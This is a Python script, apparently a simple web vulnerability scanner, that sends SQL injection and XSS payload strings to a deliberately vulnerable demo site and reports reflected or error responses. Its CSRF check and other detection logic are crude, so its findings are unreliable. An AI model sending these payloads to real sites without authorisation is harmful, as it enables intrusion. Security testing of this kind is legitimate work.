import requests
from bs4 import BeautifulSoup
import argparse


sql_payloads = list()
xss_payloads = list()
csfr_payloads = [
    {'param1': 'value1', 'param2': 'value2'},
    {'param1': 'value1', 'param2': '<script>alert(1)</script>'},
    {'param1': 'value1', 'param2': '"><script>alert(1)</script>'},
    {'param1': 'value1', 'param2': "'><script>alert(1)</script>"},
    {'param1': 'value1', 'param2': '" onfocus="alert(1)"'},
    {'param1': 'value1', 'param2': '"><img src="x" onerror="alert(1)">'},
    {'param1': 'value1', 'param2': '"><svg/onload=alert(1)>'},
    {'param1': 'value1', 'param2': '"><details/open/ontoggle=alert(1)>'},
    {'param1': 'value1', 'param2': '"><marquee/onstart=alert(1)>'},
    {'param1': 'value1', 'param2': '"><object/data="javascript:alert(1)">'},
    {'param1': 'value1', 'param2': '"><embed/src="javascript:alert(1)">'},
    {'param1': 'value1', 'param2': '"><keygen/onfocus=alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1'},
    {'param1': 'value1', 'param2': 'param2=<script>alert(1)</script>&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><script>alert(1)</script>&param1=value1'},
    {'param1': 'value1', 'param2': 'param2=\'><script>alert(1)</script>&param1=value1'},
    {'param1': 'value1', 'param2': 'param2=" onfocus="alert(1)"&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><img src="x" onerror="alert(1)">&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><svg/onload=alert(1)>&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><details/open/ontoggle=alert(1)>&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><marquee/onstart=alert(1)>&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><object/data="javascript:alert(1)">&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><embed/src="javascript:alert(1)">&param1=value1'},
    {'param1': 'value1', 'param2': 'param2="><keygen/onfocus=alert(1)>&param1=value1'},
    {'param1': 'value1', 'param2': 'param2=OR 1=1&param1=value1'},
    {'param1': 'value1', 'param2': 'param2=admin\' --&param1=value1'},
    {'param1': 'value1', 'param2': 'param2=1 OR 1=1&param1=value1'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<script>alert(1)</script>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<img src=x onerror=alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<svg/onload=alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<details open ontoggle=alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<marquee onstart=alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<object data=javascript:alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<embed src=javascript:alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=<keygen onfocus=alert(1)>'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=value3'},
    {'param1': 'value1', 'param2': 'param2=value2&param1=value1&param3=1 OR 1=1'}
]

with open('SQLINJECTION.txt','r') as file:
    for line in file:
        line = line.strip()
        sql_payloads.append(line)



with open('XSS.txt','r', encoding='utf-8') as file2:
    for line in file2:
        line = line.strip()
        xss_payloads.append(line)



def scan_sql_injection(url):
    for payload in sql_payloads:
        full_url = f"{url}?id={payload}"
        try:
            r = requests.get(full_url, timeout=10)
            if "syntax error" in r.text or "mysql_fetch_array" in r.text or "you have an error in your SQL syntax" in r.text or "1064" in r.text:
                print(f"[+] SQL Injection vulnerability found with payload: {payload}")
            else:
                print(f"[-] No SQL injection vulnerability found with payload: {payload}")
        except requests.RequestException as e:
            print(f"[-] Error connecting to {full_url}: {e}")



def scan_xss(url):
    for payload in xss_payloads:
        full_url = f"{url}?q={payload}"
        try:
            r = requests.get(full_url, timeout=10)
            if payload in r.text:
                print(f"[+] XSS vulnerability found with payload: {payload}")
            else:
                print(f"[-] No XSS vulnerability found with payload: {payload}")
        except requests.RequestException as e:
            print(f"[-] Error connecting to {full_url}: {e}")



def scan_csrf(url):
    for payload in csfr_payloads:
        try: 
            r = requests.post(url, data=payload, timeout=10)
            if "csrf_token" not in r.text:
                print(f"[+] CSRF vulnerability found with payload: {payload}")
            else:
                print(f"[-] No CSRF vulnerability found with payload: {payload}")
        except requests.RequestException as e:
            print(f"[-] Error connecting to {url} with payload {payload}: {e}")



def main():
    url = "http://testasp.vulnweb.com"

    if not url.startswith("http"):
        url = "http://" + url

    print("Scanning for SQL Injection...")
    scan_sql_injection("http://testasp.vulnweb.com")


    print("\nScanning for XSS...")
    scan_xss("http://testasp.vulnweb.com")


    print("\nScanning for SCRF...")
    scan_csrf("http://testasp.vulnweb.com")

if __name__ == "__main__":
    main()



